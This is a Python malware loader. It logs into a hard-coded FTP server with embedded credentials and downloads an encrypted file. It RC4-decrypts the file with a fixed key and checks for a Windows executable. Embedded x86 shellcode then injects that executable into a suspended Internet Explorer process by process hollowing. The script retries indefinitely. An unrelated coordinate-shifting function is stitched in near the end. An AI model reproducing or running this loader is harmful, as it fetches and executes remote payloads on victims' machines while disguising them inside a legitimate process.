import ftplib
import ctypes
import os
import sys
import time


ftp_user = "Load1"
ftp_pass = "gerasgwretarsh"
ftp_file = "1680.ENC"
ftp_host = "79.174.12.59"

sc = b''
sc+=b'\x55\x8B\xEC\x81\xEC\x70\x03\x00\x00\x83\x65\xDC\x00\x83\x65\xFC'
sc+=b'\x00\x83\x65\xF8\x00\x83\x65\xE8\x00\x83\x7D\x08\x00\x74\x06\x83'
sc+=b'\x7D\x0C\x00\x75\x07\x33\xC0\xE9\x76\x03\x00\x00\x6A\x28\x6A\x00'
sc+=b'\x8D\x45\xB4\x50\xE8\x6F\x03\x00\x00\x68\x02\x9F\xE6\x6A\xE8\x85'
sc+=b'\x08\x00\x00\x89\x45\xF8\x83\x7D\xF8\x00\x75\x07\x33\xC0\xE9\x4F'
sc+=b'\x03\x00\x00\x68\x40\x5E\xC0\x84\xE8\x6B\x08\x00\x00\x89\x45\xE8'
sc+=b'\x83\x7D\xE8\x00\x75\x07\x33\xC0\xE9\x35\x03\x00\x00\x68\x16\xD9'
sc+=b'\x51\xA8\xFF\x75\xF8\xE8\x7B\x08\x00\x00\x89\x45\xB4\x83\x7D\xB4'
sc+=b'\x00\x75\x07\x33\xC0\xE9\x18\x03\x00\x00\x68\x8D\xBF\x40\xAB\xFF'
sc+=b'\x75\xF8\xE8\x5E\x08\x00\x00\x89\x45\xB8\x83\x7D\xB8\x00\x75\x07'
sc+=b'\x33\xC0\xE9\xFB\x02\x00\x00\x68\xC1\xB9\x9E\x64\xFF\x75\xF8\xE8'
sc+=b'\x41\x08\x00\x00\x89\x45\xBC\x83\x7D\xBC\x00\x75\x07\x33\xC0\xE9'
sc+=b'\xDE\x02\x00\x00\x68\xD8\xCB\x88\x56\xFF\x75\xF8\xE8\x24\x08\x00'
sc+=b'\x00\x89\x45\xC0\x83\x7D\xC0\x00\x75\x07\x33\xC0\xE9\xC1\x02\x00'
sc+=b'\x00\x68\x4D\x82\x2E\xE6\xFF\x75\xF8\xE8\x07\x08\x00\x00\x89\x45'
sc+=b'\xC4\x83\x7D\xC4\x00\x75\x07\x33\xC0\xE9\xA4\x02\x00\x00\x68\x23'
sc+=b'\x20\x48\x6B\xFF\x75\xF8\xE8\xEA\x07\x00\x00\x89\x45\xC8\x83\x7D'
sc+=b'\xC8\x00\x75\x07\x33\xC0\xE9\x87\x02\x00\x00\x68\x42\xAE\xC7\xF7'
sc+=b'\xFF\x75\xF8\xE8\xCD\x07\x00\x00\x89\x45\xCC\x83\x7D\xCC\x00\x75'
sc+=b'\x07\x33\xC0\xE9\x6A\x02\x00\x00\x68\x2E\x97\x58\x4F\xFF\x75\xF8'
sc+=b'\xE8\xB0\x07\x00\x00\x89\x45\xD0\x83\x7D\xD0\x00\x75\x07\x33\xC0'
sc+=b'\xE9\x4D\x02\x00\x00\x68\xB9\xBE\x72\x38\xFF\x75\xF8\xE8\x93\x07'
sc+=b'\x00\x00\x89\x45\xD4\x83\x7D\xD4\x00\x75\x07\x33\xC0\xE9\x30\x02'
sc+=b'\x00\x00\x68\xF6\x3F\x48\x90\xFF\x75\xE8\xE8\x76\x07\x00\x00\x89'
sc+=b'\x45\xD8\x83\x7D\xD8\x00\x75\x07\x33\xC0\xE9\x13\x02\x00\x00\xFF'
sc+=b'\x75\x0C\xE8\xC6\x03\x00\x00\x89\x45\xFC\x83\x7D\xFC\x00\x74\x0E'
sc+=b'\x8B\x45\xFC\x0F\xB7\x40\x04\x3D\x4C\x01\x00\x00\x74\x07\x33\xC0'
sc+=b'\xE9\xED\x01\x00\x00\x6A\x10\x6A\x00\x8D\x45\xA4\x50\xE8\xE6\x01'
sc+=b'\x00\x00\x6A\x44\x6A\x00\x8D\x85\x5C\xFF\xFF\xFF\x50\xE8\xD6\x01'
sc+=b'\x00\x00\x68\xCC\x02\x00\x00\x6A\x00\x8D\x85\x90\xFC\xFF\xFF\x50'
sc+=b'\xE8\xC3\x01\x00\x00\xC7\x85\x90\xFC\xFF\xFF\x07\x00\x01\x00\x8D'
sc+=b'\x45\xA4\x50\x8D\x85\x5C\xFF\xFF\xFF\x50\x6A\x00\x6A\x00\x6A\x04'
sc+=b'\x6A\x00\x6A\x00\x6A\x00\x6A\x00\xFF\x75\x08\xFF\x55\xB4\x85\xC0'
sc+=b'\x75\x07\x33\xC0\xE9\x89\x01\x00\x00\x8D\x85\x90\xFC\xFF\xFF\x50'
sc+=b'\xFF\x75\xA8\xFF\x55\xBC\x85\xC0\x0F\x84\x64\x01\x00\x00\x83\x65'
sc+=b'\xA0\x00\x83\x65\xE4\x00\x8D\x45\xA0\x50\x6A\x04\x8D\x45\xE4\x50'
sc+=b'\x8B\x85\x34\xFD\xFF\xFF\x83\xC0\x08\x50\xFF\x75\xA4\xFF\x55\xCC'
sc+=b'\x85\xC0\x0F\x84\x3A\x01\x00\x00\x83\x7D\xA0\x04\x0F\x85\x30\x01'
sc+=b'\x00\x00\x83\x65\xF0\x00\x8B\x45\xFC\x8B\x4D\xE4\x3B\x48\x34\x75'
sc+=b'\x09\xFF\x75\xE4\xFF\x75\xA4\xFF\x55\xD8\x6A\x40\x68\x00\x30\x00'
sc+=b'\x00\x8B\x45\xFC\xFF\x70\x50\x8B\x45\xFC\xFF\x70\x34\xFF\x75\xA4'
sc+=b'\xFF\x55\xC4\x89\x45\xF0\x83\x7D\xF0\x00\x0F\x84\xF2\x00\x00\x00'
sc+=b'\x83\x65\xEC\x00\x8D\x45\xEC\x50\x8B\x45\xFC\xFF\x70\x54\xFF\x75'
sc+=b'\x0C\xFF\x75\xF0\xFF\x75\xA4\xFF\x55\xD0\x85\xC0\x0F\x84\xBA\x00'
sc+=b'\x00\x00\x8B\x45\xFC\x8B\x4D\xEC\x3B\x48\x54\x0F\x85\xAB\x00\x00'
sc+=b'\x00\x8B\x45\xFC\x8B\x40\x74\x8B\x4D\xFC\x8D\x44\xC1\x78\x89\x45'
sc+=b'\xF4\x83\x65\xE0\x00\xEB\x07\x8B\x45\xE0\x40\x89\x45\xE0\x8B\x45'
sc+=b'\xFC\x0F\xB7\x40\x06\x39\x45\xE0\x7D\x3C\x8B\x45\xF4\x83\x78\x10'
sc+=b'\x00\x76\x28\x83\x65\xEC\x00\x8D\x45\xEC\x50\x8B\x45\xF4\xFF\x70'
sc+=b'\x10\x8B\x45\xF4\x8B\x4D\x0C\x03\x48\x14\x51\x8B\x45\xF4\x8B\x4D'
sc+=b'\xF0\x03\x48\x0C\x51\xFF\x75\xA4\xFF\x55\xD0\x8B\x45\xF4\x83\xC0'
sc+=b'\x28\x89\x45\xF4\xEB\xB1\x8D\x45\xEC\x50\x6A\x04\x8B\x45\xFC\x83'
sc+=b'\xC0\x34\x50\x8B\x85\x34\xFD\xFF\xFF\x83\xC0\x08\x50\xFF\x75\xA4'
sc+=b'\xFF\x55\xD0\x8B\x45\xFC\x8B\x4D\xF0\x03\x48\x28\x89\x8D\x40\xFD'
sc+=b'\xFF\xFF\x8D\x85\x90\xFC\xFF\xFF\x50\xFF\x75\xA8\xFF\x55\xC0\xFF'
sc+=b'\x75\xA8\xFF\x55\xD4\xC7\x45\xDC\x01\x00\x00\x00\x83\x7D\xDC\x00'
sc+=b'\x75\x10\x68\x00\x80\x00\x00\x6A\x00\xFF\x75\xF0\xFF\x75\xA4\xFF'
sc+=b'\x55\xC8\x83\x7D\xDC\x00\x75\x08\x6A\x00\xFF\x75\xA4\xFF\x55\xB8'
sc+=b'\x33\xC0\x8B\xE5\x5D\xC2\x08\x00\x55\x8B\xEC\x51\x51\x8B\x45\x08'
sc+=b'\x89\x45\xFC\x8B\x45\x10\x89\x45\xF8\x8B\x45\x10\x48\x89\x45\x10'
sc+=b'\x83\x7D\xF8\x00\x74\x16\x8B\x45\x0C\x25\xFF\x00\x00\x00\x8B\x4D'
sc+=b'\xFC\x88\x01\x8B\x45\xFC\x40\x89\x45\xFC\xEB\xD7\x8B\xE5\x5D\xC2'
sc+=b'\x0C\x00\x55\x8B\xEC\x51\x51\x8B\x45\x08\x89\x45\xFC\x8B\x45\x10'
sc+=b'\x89\x45\xF8\x8B\x45\x10\x48\x89\x45\x10\x83\x7D\xF8\x00\x74\x24'
sc+=b'\x8B\x45\xFC\x0F\xB6\x00\x8B\x4D\x0C\x81\xE1\xFF\x00\x00\x00\x0F'
sc+=b'\xB6\xC9\x3B\xC1\x75\x05\x8B\x45\xFC\xEB\x0B\x8B\x45\xFC\x40\x89'
sc+=b'\x45\xFC\xEB\xC9\x33\xC0\x8B\xE5\x5D\xC2\x0C\x00\x55\x8B\xEC\xFF'
sc+=b'\x75\x08\xE8\x61\x00\x00\x00\x40\x50\xFF\x75\x0C\xFF\x75\x08\xE8'
sc+=b'\x9E\xFF\xFF\xFF\x5D\xC2\x08\x00\x55\x8B\xEC\x51\xC7\x45\xFC\x01'
sc+=b'\x00\x00\x00\x83\x7D\x08\x00\x74\x36\x83\x7D\x0C\x00\x74\x30\x8B'
sc+=b'\x45\x08\x0F\xBE\x00\x8B\x4D\x0C\x0F\xBE\x09\x3B\xC1\x75\x20\x8B'
sc+=b'\x45\x08\x0F\xBE\x00\x85\xC0\x75\x06\x83\x65\xFC\x00\xEB\x10\x8B'
sc+=b'\x45\x08\x40\x89\x45\x08\x8B\x45\x0C\x40\x89\x45\x0C\xEB\xD0\x8B'
sc+=b'\x45\xFC\x8B\xE5\x5D\xC2\x08\x00\x55\x8B\xEC\x51\x51\x83\x65\xFC'
sc+=b'\x00\x8B\x45\x08\x0F\xBE\x00\x89\x45\xF8\x8B\x45\x08\x40\x89\x45'
sc+=b'\x08\x83\x7D\xF8\x00\x74\x09\x8B\x45\xFC\x40\x89\x45\xFC\xEB\xE1'
sc+=b'\x8B\x45\xFC\x8B\xE5\x5D\xC2\x04\x00\x55\x8B\xEC\x83\xEC\x4C\xFF'
sc+=b'\x75\x08\xE8\xA1\x04\x00\x00\x89\x45\xF8\x83\x7D\xF8\x00\x74\x75'
sc+=b'\x83\x7D\xF8\x3F\x73\x6F\x83\x65\xFC\x00\xEB\x07\x8B\x45\xFC\x40'
sc+=b'\x89\x45\xFC\x8B\x45\xFC\x3B\x45\xF8\x73\x2F\x8B\x45\xFC\x8B\x4D'
sc+=b'\x08\x0F\xB7\x04\x41\x3D\x80\x00\x00\x00\x7C\x04\x33\xC0\xEB\x47'
sc+=b'\x8B\x45\xFC\x8B\x4D\x08\x0F\xB7\x04\x41\x50\xE8\x30\x04\x00\x00'
sc+=b'\x59\x8B\x4D\xFC\x88\x44\x0D\xB4\xEB\xC2\x8B\x45\xFC\xC6\x44\x05'
sc+=b'\xB4\x00\xFF\x75\xF8\x8D\x45\xB4\x50\xE8\x00\x03\x00\x00\x3B\x45'
sc+=b'\x0C\x75\x09\xC7\x45\xF4\x01\x00\x00\x00\xEB\x04\x83\x65\xF4\x00'
sc+=b'\x8B\x45\xF4\xEB\x02\x33\xC0\x8B\xE5\x5D\xC2\x08\x00\x55\x8B\xEC'
sc+=b'\x83\xEC\x0C\x83\x65\xF4\x00\x83\x7D\x08\x00\x74\x30\x8B\x45\x08'
sc+=b'\x89\x45\xFC\x8B\x45\xFC\x0F\xB7\x00\x3D\x4D\x5A\x00\x00\x75\x1D'
sc+=b'\x8B\x45\xFC\x8B\x4D\x08\x03\x48\x3C\x89\x4D\xF8\x8B\x45\xF8\x81'
sc+=b'\x38\x50\x45\x00\x00\x75\x06\x8B\x45\xF8\x89\x45\xF4\x8B\x45\xF4'
sc+=b'\x8B\xE5\x5D\xC2\x04\x00\x55\x8B\xEC\x81\xEC\x88\x00\x00\x00\x83'
sc+=b'\x65\xCC\x00\x83\x4D\xEC\xFF\xFF\x75\x08\xE8\x9E\xFF\xFF\xFF\x89'
sc+=b'\x45\xE4\x83\x7D\xE4\x00\x0F\x84\x39\x02\x00\x00\x6A\x08\x58\x6B'
sc+=b'\xC0\x00\x8B\x4D\xE4\x8B\x44\x01\x78\x89\x45\xF8\x6A\x08\x58\x6B'
sc+=b'\xC0\x00\x8B\x4D\xE4\x8B\x44\x01\x7C\x89\x45\xC8\x83\x7D\xF8\x00'
sc+=b'\x0F\x84\x0F\x02\x00\x00\x83\x7D\xC8\x00\x0F\x84\x05\x02\x00\x00'
sc+=b'\x83\x7D\x0C\x00\x75\x2C\x83\x7D\x10\x00\x75\x26\x8B\x45\x14\x89'
sc+=b'\x45\xE0\x8B\x45\xF8\x8B\x4D\xE0\x3B\x48\x10\x72\x15\x81\x7D\xE0'
sc+=b'\xFF\xFF\x00\x00\x77\x0C\x8B\x45\xF8\x8B\x4D\xE0\x2B\x48\x10\x89'
sc+=b'\x4D\xEC\x83\x7D\x0C\x00\x0F\x84\x82\x00\x00\x00\x83\x7D\x10\x00'
sc+=b'\x74\x7C\x8B\x45\xF8\x03\x45\x08\x89\x45\xF8\x8B\x45\xF8\x8B\x40'
sc+=b'\x18\x89\x45\xDC\x83\x65\xD8\x00\x8B\x45\xF8\x8B\x4D\x08\x03\x48'
sc+=b'\x20\x89\x4D\xF0\x8B\x45\xDC\x89\x45\xBC\x8B\x45\xDC\x48\x89\x45'
sc+=b'\xDC\x83\x7D\xBC\x00\x74\x47\x8B\x45\xF0\x83\x38\x00\x74\x2D\x8B'
sc+=b'\x45\xF0\x8B\x00\x03\x45\x08\x89\x45\xB8\xFF\x75\x14\xFF\x75\xB8'
sc+=b'\xFF\x55\x10\x85\xC0\x74\x15\x8B\x45\xF8\x8B\x4D\x08\x03\x48\x24'
sc+=b'\x8B\x45\xD8\x0F\xB7\x04\x41\x89\x45\xEC\xEB\x12\x8B\x45\xF0\x83'
sc+=b'\xC0\x04\x89\x45\xF0\x8B\x45\xD8\x40\x89\x45\xD8\xEB\xA6\x83\x7D'
sc+=b'\xEC\x00\x0F\x8C\x3D\x01\x00\x00\x8B\x45\xF8\x8B\x4D\x08\x03\x48'
sc+=b'\x1C\x8B\x45\xEC\x8B\x04\x81\x03\x45\x08\x89\x45\xF4\x8B\x45\xF4'
sc+=b'\x3B\x45\xF8\x0F\x82\x16\x01\x00\x00\x8B\x45\xF8\x03\x45\xC8\x39'
sc+=b'\x45\xF4\x0F\x83\x07\x01\x00\x00\x83\x65\xE8\x00\x6A\x2E\xFF\x75'
sc+=b'\xF4\xE8\x26\xFD\xFF\xFF\x89\x45\xE8\x83\x7D\xE8\x00\x0F\x84\xEA'
sc+=b'\x00\x00\x00\x8B\x45\xE8\x2B\x45\xF4\x89\x45\xD4\x0F\x84\xDB\x00'
sc+=b'\x00\x00\x83\x7D\xD4\x3A\x0F\x8D\xD1\x00\x00\x00\x83\x65\xFC\x00'
sc+=b'\xEB\x07\x8B\x45\xFC\x40\x89\x45\xFC\x8B\x45\xFC\x3B\x45\xD4\x7F'
sc+=b'\x14\x8B\x45\xF4\x03\x45\xFC\x8B\x4D\xFC\x8A\x00\x88\x84\x0D\x78'
sc+=b'\xFF\xFF\xFF\xEB\xDD\x8B\x45\xFC\xC6\x84\x05\x78\xFF\xFF\xFF\x44'
sc+=b'\x8B\x45\xFC\x40\x89\x45\xFC\x8B\x45\xFC\xC6\x84\x05\x78\xFF\xFF'
sc+=b'\xFF\x4C\x8B\x45\xFC\x40\x89\x45\xFC\x8B\x45\xFC\xC6\x84\x05\x78'
sc+=b'\xFF\xFF\xFF\x4C\x8B\x45\xFC\x40\x89\x45\xFC\x8B\x45\xFC\xC6\x84'
sc+=b'\x05\x78\xFF\xFF\xFF\x00\x83\x65\xC0\x00\xE8\x05\x00\x00\x00\xE8'
sc+=b'\x83\x01\x00\x00\x58\x03\x40\x01\x83\xC0\x05\x89\x45\xC0\x83\x65'
sc+=b'\xD0\x00\x68\x8D\xBD\xC1\x3F\x68\x02\x9F\xE6\x6A\xE8\x07\x01\x00'
sc+=b'\x00\x50\xE8\x2E\x01\x00\x00\x89\x45\xC4\x83\x7D\xC4\x00\x74\x2D'
sc+=b'\x8D\x85\x78\xFF\xFF\xFF\x50\xFF\x55\xC4\x89\x45\xD0\x83\x7D\xD0'
sc+=b'\x00\x74\x1A\x33\xC0\x40\xC1\xE0\x00\x03\x45\xE8\x50\xFF\x75\xC0'
sc+=b'\x6A\x01\xFF\x75\xD0\xE8\xAC\xFD\xFF\xFF\x89\x45\xCC\xEB\x06\x8B'
sc+=b'\x45\xF4\x89\x45\xCC\x8B\x45\xCC\x8B\xE5\x5D\xC2\x10\x00\x55\x8B'
sc+=b'\xEC\x51\xFF\x75\x08\xE8\x7E\xFC\xFF\xFF\x50\xFF\x75\x08\xE8\x1B'
sc+=b'\x00\x00\x00\x3B\x45\x0C\x75\x09\xC7\x45\xFC\x01\x00\x00\x00\xEB'
sc+=b'\x04\x83\x65\xFC\x00\x8B\x45\xFC\x8B\xE5\x5D\xC2\x08\x00\x55\x8B'
sc+=b'\xEC\x83\xEC\x14\x83\x7D\x08\x00\x74\x06\x83\x7D\x0C\x00\x75\x04'
sc+=b'\x33\xC0\xEB\x6E\x83\x65\xF4\x00\x83\x4D\xFC\xFF\x83\x7D\x0C\x00'
sc+=b'\x74\x5B\x8B\x45\x08\x03\x45\xF4\x0F\xB6\x00\x89\x45\xF0\x8B\x45'
sc+=b'\xFC\x33\x45\xF0\x89\x45\xFC\xC7\x45\xF8\x07\x00\x00\x00\xEB\x07'
sc+=b'\x8B\x45\xF8\x48\x89\x45\xF8\x83\x7D\xF8\x00\x7C\x20\x8B\x45\xFC'
sc+=b'\x83\xE0\x01\xF7\xD8\x89\x45\xEC\x8B\x45\xFC\xD1\xE8\x8B\x4D\xEC'
sc+=b'\x81\xE1\x20\x83\xB8\xED\x33\xC1\x89\x45\xFC\xEB\xD3\x8B\x45\xF4'
sc+=b'\x40\x89\x45\xF4\x8B\x45\x0C\x48\x89\x45\x0C\xEB\x9F\x8B\x45\xFC'
sc+=b'\xF7\xD0\x8B\xE5\x5D\xC2\x08\x00\x55\x8B\xEC\x51\x83\x65\xFC\x00'
sc+=b'\xE8\x05\x00\x00\x00\xE8\xEF\xFB\xFF\xFF\x58\x03\x40\x01\x83\xC0'
sc+=b'\x05\x89\x45\xFC\xFF\x75\x08\xFF\x75\xFC\xE8\xBB\x00\x00\x00\x8B'
sc+=b'\xE5\x5D\xC2\x04\x00\x55\x8B\xEC\x51\x83\x65\xFC\x00\xE8\x05\x00'
sc+=b'\x00\x00\xE8\x07\xFF\xFF\xFF\x58\x03\x40\x01\x83\xC0\x05\x89\x45'
sc+=b'\xFC\xFF\x75\x0C\xFF\x75\xFC\x6A\x01\xFF\x75\x08\xE8\x85\xFC\xFF'
sc+=b'\xFF\x8B\xE5\x5D\xC2\x08\x00\x55\x8B\xEC\x51\xFF\x75\x0C\xFF\x75'
sc+=b'\x08\xE8\x12\xFB\xFF\xFF\x85\xC0\x75\x09\xC7\x45\xFC\x01\x00\x00'
sc+=b'\x00\xEB\x04\x83\x65\xFC\x00\x8B\x45\xFC\x8B\xE5\x5D\xC2\x08\x00'
sc+=b'\x55\x8B\xEC\x51\x83\x7D\x08\x41\x7C\x11\x83\x7D\x08\x5A\x7F\x0B'
sc+=b'\x8B\x45\x08\x83\xC0\x20\x89\x45\xFC\xEB\x06\x8B\x45\x08\x89\x45'
sc+=b'\xFC\x8B\x45\xFC\x8B\xE5\x5D\xC3\x55\x8B\xEC\x51\x51\x83\x65\xFC'
sc+=b'\x00\x8B\x45\x08\x0F\xB7\x00\x89\x45\xF8\x8B\x45\x08\x40\x40\x89'
sc+=b'\x45\x08\x83\x7D\xF8\x00\x74\x09\x8B\x45\xFC\x40\x89\x45\xFC\xEB'
sc+=b'\xE0\x8B\x45\xFC\x8B\xE5\x5D\xC2\x04\x00\x55\x8B\xEC\x83\xEC\x14'
sc+=b'\x83\x7D\x08\x00\x74\x56\x64\xA1\x30\x00\x00\x00\x89\x45\xF0\x8B'
sc+=b'\x45\xF0\x8B\x40\x0C\x89\x45\xEC\x8B\x45\xEC\x83\xC0\x14\x89\x45'
sc+=b'\xF8\x8B\x45\xF8\x8B\x00\x89\x45\xFC\x8B\x45\xFC\x3B\x45\xF8\x74'
sc+=b'\x2B\x8B\x45\xFC\x83\xE8\x08\x89\x45\xF4\xFF\x75\x0C\x8B\x45\xF4'
sc+=b'\xFF\x70\x30\xFF\x55\x08\x85\xC0\x74\x08\x8B\x45\xF4\x8B\x40\x18'
sc+=b'\xEB\x0C\x8B\x45\xFC\x8B\x00\x89\x45\xFC\xEB\xCD\x33\xC0\x8B\xE5'
sc+=b'\x5D\xC2\x08\x00'

BYTE      = ctypes.c_ubyte
WORD      = ctypes.c_ushort
DWORD     = ctypes.c_ulong
LPSTR 	  = ctypes.c_char_p 
HANDLE    = ctypes.c_void_p

CREATE_SUSPENDED = 0x0004
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

def encode_data(data):
    key = b"KIIkIjF5T"
    S = bytearray(range(256))
    j = 0
    out = bytearray()
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i] , S[j] = S[j] , S[i]
    i = j = 0
    for char in data:
        i = ( i + 1 ) % 256
        j = ( j + S[i] ) % 256
        S[i] , S[j] = S[j] , S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])
    return(bytes(out))

def download():
    def callback(d):
        global data 
        print("+++", hex(len(d)))
        data += d
    while True:
        try:
            print(ftp_host, ftp_user, ftp_pass)
            ftp = ftplib.FTP(ftp_host)
            ftp.login(ftp_user, ftp_pass)
            ftp.retrbinary("RETR %s" % ftp_file, callback)
            break
        except Exception as e:
            time.sleep(5*60)

def runpe(peimage):
    filepathenv = "%ProgramFiles%\\Internet Explorer\\iexplore.exe"
    filepath = os.path.expandvars(filepathenv)
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    p = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(sc)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(p), sc, ctypes.c_int(len(sc)))
    q = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(peimage)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(q), peimage, ctypes.c_int(len(peimage)))
    run = ctypes.cast(p, ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p))
    run(filepath.encode('utf8')+b'\x00', q)

if (ctypes.sizeof(ctypes.c_void_p) * 8) != 32:
    print("ERR: Invalid machine architecture!")
    sys.exit(1)
while True:
    data = b''
    download()
    out = encode_data(data)
    if out[:2] == b'MZ':
        break
    time.sleep(1)
    
def shiftXCoordinate(shape):
    shiftValue = 100
    point = shape.getPart(0)
    point.X += shiftValue
    return point         
runpe(out)